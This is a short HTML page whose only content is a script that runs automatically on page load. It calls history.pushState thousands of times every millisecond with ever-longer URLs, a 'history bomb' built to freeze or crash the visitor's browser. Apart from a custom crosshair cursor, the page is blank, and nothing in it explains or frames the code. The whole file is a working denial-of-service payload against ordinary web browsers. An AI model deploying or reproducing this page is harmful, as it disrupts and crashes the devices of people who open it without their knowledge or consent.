<!DOCTYPE html>
<html>
<head>
	
<style type="text/css">
	html, body {
    width: 100%;
    height: 100%;
}
</style>

<script> 
	function bomb_url() {
	  var total = "";
	  for( var i = 0; i < 10000; i++ ) {
	    total = total + i.toString();
	    history.pushState(0,0, total);
	  }
	}

	function intervalCall() {
	  setInterval(function(){ 
	    bomb_url(); }, 1);
	}

</script>
</head>

<body onload="intervalCall()" style="background:#00000; cursor: url('cursor.png') 100 100, crosshair;">
</body>

</html>
